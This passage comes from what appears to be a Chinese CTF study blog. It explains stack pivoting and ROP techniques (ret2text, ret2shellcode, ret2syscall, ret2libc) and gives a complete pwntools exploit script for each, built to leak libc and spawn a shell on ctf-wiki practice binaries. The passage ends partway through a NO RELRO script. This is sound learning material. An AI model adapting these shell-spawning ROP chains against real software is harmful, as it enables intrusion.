及进行堆漏洞利用</li></ul><p>所以基本思路就是，先在栈上面构建好ROP链，之后让程序跳转执行我们构建好的ROP链。但是我们需要知道跳转地址，也就是我们构造好ROP链的位置。<img src="https://i.loli.net/2021/11/06/oGFmLB3sAyp6eJW.png" alt="image.png"></p><p>程序会一直执行这个函数，函数会使用read函数将输入内容写入buf变量，再用puts函数输出。<strong>read函数不同于gets函数，read读取完以后不会像gets函数一样在数据后面补充\0</strong>，所以只要我们将缓冲区填满，就可以泄露rbp指向的地址了，再通过计算偏移就可以确定栈的位置了。</p><p><img src="https://i.loli.net/2021/11/06/xqCWVgiK46U1kRa.png" alt="屏幕截图 2021-11-06 110037.png"></p><p>接下来就是计算偏移0x7fffffffde40-0x7fffffffddd0=0x70</p><p><img src="https://i.loli.net/2021/11/06/niKAlfQtydDSrCY.png" alt="屏幕截图 2021-11-06 110610.png"></p><p>所以payload2就构建好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stack = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>)) - <span class="number">0x70</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi_ret)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(<span class="number">0x400676</span>)</span><br><span class="line">payload += (<span class="string">&#x27;a&#x27;</span>*(<span class="number">80</span>-<span class="built_in">len</span>(payload))+p64(stack)+p64(<span class="number">0x4006be</span>)) <span class="comment">#leave_ret</span></span><br></pre></td></tr></table></figure><p>接下来就是匹配libc库以及计算system以及bin/sh的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">success(<span class="string">&quot;libc.address -&gt; &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(libcbase))</span><br><span class="line">system_addr=libcbase+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr=libcbase+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br></pre></td></tr></table></figure><p>由于利用过程中栈的结构会发生变化, 所以一些关键的偏移还需要通过调试来确定</p><p><img src="https://i.loli.net/2021/11/06/n8sfBd9X6vQJFWu.png" alt="image.png"></p><p>第三次输入时，rbp指向地址对应栈帧偏移不再是stack了，而是stack-0x30了。修改后得到payload3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>, ret_addr,pop_rdi_ret,binsh_addr,system_addr])</span><br><span class="line">payload += (<span class="string">&#x27;a&#x27;</span>*(<span class="number">80</span>-<span class="built_in">len</span>(payload))+p64(stack)+p64(<span class="number">0x4006be</span>))</span><br></pre></td></tr></table></figure><h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.binary = <span class="string">&quot;./over.over&quot;</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400793</span></span><br><span class="line">ret_addr = <span class="number">0x0400509</span></span><br><span class="line">io = process(<span class="string">&quot;./over.over&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./over.over&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">80</span>)</span><br><span class="line">stack = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>)) - <span class="number">0x70</span></span><br><span class="line">success(<span class="string">&quot;stack -&gt; &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(stack))</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi_ret)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(<span class="number">0x400676</span>)</span><br><span class="line">payload += (<span class="string">&#x27;a&#x27;</span>*(<span class="number">80</span>-<span class="built_in">len</span>(payload))+p64(stack)+p64(<span class="number">0x4006be</span>)) <span class="comment">#leave_ret</span></span><br><span class="line">io.sendafter(<span class="string">&quot;&gt;&quot;</span>, payload)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">success(<span class="string">&quot;libc.address -&gt; &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(libcbase))</span><br><span class="line">system_addr=libcbase+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr=libcbase+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">payload=flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>, ret_addr,pop_rdi_ret,binsh_addr,system_addr])</span><br><span class="line">payload += (<span class="string">&#x27;a&#x27;</span>*(<span class="number">80</span>-<span class="built_in">len</span>(payload))+p64(stack-<span class="number">0x30</span>)+p64(<span class="number">0x4006be</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP-x86</title>
      <link href="/post/ROP-x86.html"/>
      <url>/post/ROP-x86.html</url>
      
        <content type="html"><![CDATA[<h1 id="ROP原理"><a href="#ROP原理" class="headerlink" title="ROP原理"></a>ROP原理</h1><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p><ul><li>程序存在溢出，并且可以控制返回地址。</li><li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li></ul><p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></h1><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>控制程序执行程序本身已有的的代码 (.text)</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先查看附件，32位可执行文件且只开了NX保护</p><p><img src="https://i.loli.net/2021/06/06/TX1cHdubI45RlPp.png" alt="image.png"></p><p>利用IDA查看伪代码，可以看到，主函数存在栈溢出漏洞<img src="https://i.loli.net/2021/06/06/i4CJDosGfOb1TEQ.png" alt="image.png"></p><p>不仅如此，在secure函数中发现了系统调用，其地址为0x0804863A，所以我们可以利用secure函数的代码来获取系统的shell<img src="https://i.loli.net/2021/06/06/Wsz8ARtm6n4LYIa.png" alt="image.png"></p><p>接下来就是计算s的偏移量。设置断点0x08048641，进行调试</p><p>可以看到，esp指向地址为0xffffcf70，ebp指向地址为0xffffcff8，因为s的地址为esp+0x1c，所以s相当于ebp的偏移量为：0xffffcff8-0xffffcf70-0x1c=0x6c，s相当于返回地址的偏移量为： 0x6c+4<img src="https://i.loli.net/2021/06/06/KFQVS5bCJfePYTs.png" alt="image.png"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;a&#x27;</span> * (<span class="number">0x6c</span>+<span class="number">4</span>) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>通过栈溢出直接跳转到对应的后门函数，从而获取shell，堆栈图如下：</p><p><img src="https://i.loli.net/2021/10/16/Iun5QrlVOhaJwRK.png" alt="image.png"></p><h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></h1><h2 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h2><p>程序执行我们自己填充的shellcode代码</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>按照ret2text思路，发现存在栈溢出，计算出s相对于返回地址的偏移量为112。查看字符串，并没有发现system函数，但是我们发现我们输入的字符串会复制到buf2，所以我们可以利用buf2构造shellcode代码，<img src="https://i.loli.net/2021/06/06/QbU3YlyvFrws2V8.png" alt="image.png"><img src="https://i.loli.net/2021/06/06/3lnkurmIjBxszJG.png" alt="image.png"></p><p>先判断一下buf2所在地址是否可执行。利用IDA查看buf2的地址<img src="https://i.loli.net/2021/06/06/aVwCQ9mclOuWKdY.png" alt="image.png"></p><p>在查看一下这个地址是否可执行。发现这个地址可读可写可执行。<img src="https://i.loli.net/2021/06/06/xFsyLRJPEoZ4YfS.png" alt="image.png"></p><p>之后构建payload</p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line"></span><br><span class="line">buf2 = <span class="number">0x804A080</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust(<span class="number">112</span>, <span class="string">&#x27;a&#x27;</span>) + p32(buf2)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="string">&quot;&quot;&quot;解释一下&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;shellcraft.sh作用是生成好system(&quot;bin/sh&quot;)的代码&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;asm函数是将代码转成机器指令&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;ljust函数作用就是向右对其并用给定字符补充字符串&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>通过栈溢出跳转到我们写好shellcode的区域，让程序执行shellcode从而获取shell</p><p><img src="https://i.loli.net/2021/10/16/gKpoSxOZ6EDCtrN.png" alt="image.png"></p><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2syscall</a></h1><h2 id="方法-2"><a href="#方法-2" class="headerlink" title="方法"></a>方法</h2><p>控制程序执行系统调用，获取 shell。</p><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>先查看附件</p><p><img src="https://i.loli.net/2021/06/06/E548xu9R7JOXjph.png" alt="image.png"></p><p>接下来利用 IDA 来查看源码，并没有system函数，而且也没有bin/sh字符<img src="https://i.loli.net/2021/06/06/Ih4PmFtxo63OgBn.png" alt="image.png"></p><p>可以看到，函数存在栈溢出，接下来就是计算v4的偏移量。先设置断点，将断点设置在调用gets函数那里<img src="https://i.loli.net/2021/06/06/mgMuoesVOpEzWXQ.png" alt="image.png"></p><p>接下来就是调试。可以看到esp指向地址0xffffcf80，v4的地址为esp+1c，ebp指向的地址0xffffd008，由此可以计算出v4的偏移量为0xffffd008-0xffffcf80-0x1c=108，所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。<img src="https://i.loli.net/2021/06/06/qzpYFsk2cQNmg14.png" alt="image.png"></p><p>此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。（<a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8">系统调用基本知识</a>）我们可以通过执行 int 0x80 来执行对应的系统调用。对于这道题，我们可以使用这个系统调用**execve(“/bin/sh”,NULL,NULL)**，其中，该程序是 32 位，这个系统调用需要满足的条件：</p><ul><li>系统调用号，即 eax 应该为 0xb（是指系统调用编号）</li><li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0</li><li>第三个参数，即 edx 应该为 0</li></ul><p>64位shellcode的参数和execve调用应为：</p><ul><li>rax = 0x3b</li><li>rdi指向”/bin/sh”</li><li>rsi = 0x0</li><li>rdx = 0x0</li><li>execve(“/bin/sh”, 0, 0);</li></ul><p>为满足这些条件，我们可以使用 gadgets来完成。如利用堆栈对寄存器赋值，先将10存入栈中，再pop eax。所以，接下来就是寻找符合条件的gadgets。（<a href="https://www.wangan.com/docs/678">ROPgadget安装与使用方法</a>）<img src="https://i.loli.net/2021/06/06/lExnp75bSDTwsyi.png" alt="image.png"></p><p>接下来就是组装：**payload = flat([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, bin_sh, int_0x80])**，其中 0xb 为 execve 对应的系统调用号。</p><h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">bin_sh = <span class="number">0x80be408</span></span><br><span class="line">payload =<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>+p32(pop_eax_ret)+ p32(<span class="number">0xb</span>)+p32(pop_edx_ecx_ebx_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bin_sh)+p32(int_0x80)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/16/3Jz9KSrEgZDPcYW.png" alt="image.png"></p><h1 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">ret2libc1</a></h1><h2 id="方法-3"><a href="#方法-3" class="headerlink" title="方法"></a>方法</h2><p>利用gadgets构建ROP获取shell</p><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>check一下32位程序，且只开了NX保护</p><p><img src="https://i.loli.net/2021/07/12/T7UivSYopaZFkxK.png" alt="image.png"></p><p>丢进IDA，查看伪代码，存在gets函数，很明显存在栈溢出<img src="https://i.loli.net/2021/07/12/Z6y1jb4Rx7zoien.png" alt="image.png"></p><p>查看函数列表以及字符串列表，很明显可以构建ROP<img src="https://i.loli.net/2021/07/12/R49gkfUZyHouv3e.png" alt="屏幕截图 2021-07-12 101906.png"></p><p>最后就是计算偏移量。s的偏移量0xffffcfb8-ffffcf4c=6c，相对于返回地址的偏移量6c+4<img src="https://i.loli.net/2021/07/12/j4w8hMAQ1ntcyfp.png" alt="image.png"></p><h2 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line">sys_addr = <span class="number">0x8048460</span></span><br><span class="line">bin_sh = <span class="number">0x08048720</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>+p32(sys_addr)+‘a<span class="string">&#x27;*4+p32(bin_sh)</span></span><br><span class="line"><span class="string">p.sendline(payload)</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;因为调用system函数中途需要一个返回地址，而直接利用system gadget会导致缺失返回地址，所以需要一个虚拟地址p32(0x11111111)平衡堆栈&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/16/K6agdE8mjHhtR1M.png" alt="image.png"></p><h1 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2">ret2libc2</a></h1><p>ida查看，可以看到这里有system函数，但是没有bin/sh，但是这里有gets函数，我们可以利用gets函数传入bin/sh字符，从而利用system获取shell</p><p><img src="https://i.loli.net/2021/08/30/lJf9ZiPbnCsWDQq.png" alt="屏幕截图 2021-08-30 093824.png"></p><p><img src="https://i.loli.net/2021/08/30/n2o6rlDEY1vsKhH.png" alt="image.png"></p><p>计算好偏移，将通过gets获取的字符存入到bss段可写区域</p><p><img src="https://i.loli.net/2021/08/30/XRCi8KrmfosnlcY.png" alt="屏幕截图 2021-08-30 105444.png"></p><h2 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line">sys_addr = <span class="number">0x08048490</span></span><br><span class="line">bss = <span class="number">0x804a000</span></span><br><span class="line">gets_addr = <span class="number">0x8048460</span></span><br><span class="line">pop_ebx = <span class="number">0x0804843d</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>+p32(gets_addr)+p32(sys_addr)+p32(bss)+p32(bss)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>栈示意图如下：</p><p><img src="https://i.loli.net/2021/10/15/1oSdCuYms2y97iI.png" alt="image.png"></p><h1 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h1><h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><p>这次的题目没有system函数，也没有bin/sh字符串，也不像ret2shellcode可以跳转执行shellcode，因此，只能换过一种思路。在libc.so 动态链接库中函数的偏移是固定的，所以我们可以通过泄露某个函数的偏移来确定程序使用的libc版本，从而获取system函数的的地址。我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong>（所谓延迟绑定，就是当函数第一次被调用的时候才进行绑定（包括符号查找、重定位等），如果函数从来没有用到过就不进行绑定。基于延迟绑定可以大大加快程序的启动速度，特别有利于一些引用了大量函数的程序）具体操作如下：</p><ul><li><p>泄露 __libc_start_main 地址</p></li><li><p>获取 libc 版本</p></li><li><p>获取 system 地址与 /bin/sh 的地址</p></li><li><p>再次执行源程序</p></li><li><p>触发栈溢出执行 system(‘/bin/sh’)</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="https://i.loli.net/2021/10/16/zTAHIWrEq6UB3Lf.png" alt="屏幕截图 2021-10-16 145422.png"></p><h2 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>]        <span class="comment"># 获取程序中puts函数的plt地址</span></span><br><span class="line">libc_puts_got = ret2libc3.got[<span class="string">&#x27;puts&#x27;</span>]          <span class="comment"># 获取程序中puts函数的got</span></span><br><span class="line">start_addr = ret2libc3.symbols[<span class="string">&#x27;_start&#x27;</span>]        <span class="comment"># 获取程序中_start函数的地址</span></span><br><span class="line">payload1 = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, puts_plt,start_addr , libc_puts_got])        <span class="comment"># 通过栈溢出让程序跳转到puts函数泄露出libc_puts_got地址再返回到start函数重新执行</span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>, payload1)</span><br><span class="line">libc_puts_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>])         <span class="comment"># 接收puts函数的地址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, libc_puts_addr)       <span class="comment"># 确定程序使用的libc</span></span><br><span class="line">libcbase = libc_puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)       <span class="comment"># 计算基地址</span></span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)         <span class="comment"># 计算出system函数以及bin/sh字符串的地址</span></span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload2 = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, system_addr, <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://i.loli.net/2021/10/16/ZDnvcXt1YoPOlSV.png" alt="image.png"></p><p>参考文章：<a href="https://ctf-wiki.org/pwn/linux/stackoverflow/basic-rop/#ret2syscall">https://ctf-wiki.org/pwn/linux/stackoverflow/basic-rop/#ret2syscall</a></p><h1 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO RELRO"></a>NO RELRO</h1><p>介绍这道题前先补充一些知识点：</p><h2 id="dl-runtime-resolve-函数"><a href="#dl-runtime-resolve-函数" class="headerlink" title="dl_runtime_resolve 函数"></a>dl_runtime_resolve 函数</h2><p>在延迟绑定中说到dl_runtime_resolve 函数，只是说了这个函数会寻找程序第一次执行的函数但是并没有说原理，这次来补充一下。</p><ol><li><p>dl_runtime_resolve 需要两个参数，一个是 reloc_arg，就是函数自己的 plt 表项 push 的内容，一个是link_map，这个是公共 plt 表项 push 进栈的，通过它可以找到.dynamic的地址</p></li><li><p>而 .dynamic 可以找到 .dynstr、.dynsym、.rel.plt 的这些东西的地址</p><ul><li>.dynstr 的地址是 .dynamic + 0x44 -&gt; 0x08048278</li><li>.dynsym 的地址是 .dynamic + 0x4c -&gt; 0x080481d8</li></ul><ul><li>.rel.plt 的地址是 .dynamic + 0x84 -&gt; 0x08048330</li></ul></li><li><p>.rel.plt 的地址加上 reloc_arg 可以得到函数重定位表项 Elf32_Rel 的指针，这个指针对应的里面放着 r_offset、r_info</p></li><li><p>将 r_info&gt;&gt;8 得到的就是 .dynsym 的下标，这个下标的内容就是 name_offset</p></li><li><p>.dynstr+name_offset 得到的就是 st_name，而 st_name 存放的就是要调用函数的函数名</p></li><li><p>在动态链接库里面找这个函数的地址，赋值给 *rel-&gt;r_offset，也就是 GOT 表就完成了一次函数的动态链接</p></li></ol><p><img src="https://i.loli.net/2021/10/21/BjXtb1uwMRVeDng.png" alt="image.png"></p><h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><p>栈迁移作用是让程序跳转到我们构造好的栈中从而让程序按照我们的思路走下去。</p><ul><li>先用无用字符填满到rbp</li><li>在将rbp跳转到我们想构造的栈帧位置</li><li>再通过read向我们想构造的栈中写入数据</li><li>最后通过leave_ret将esp指向栈帧，ebp指向栈底位置</li></ul><p><img src="https://i.loli.net/2021/10/20/yHcJdKsqGZ5zCeP.png" alt="image.png"></p><p>因为步骤有点多，所以就边写边改。</p><h2 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h2><p>先将栈迁移到我们想构造的地方并在该地方写入我们想要写的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;main&#x27;</span>)</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">ppp_ret = <span class="number">0x08048619</span> <span class="comment"># ROPgadget --binary main--only 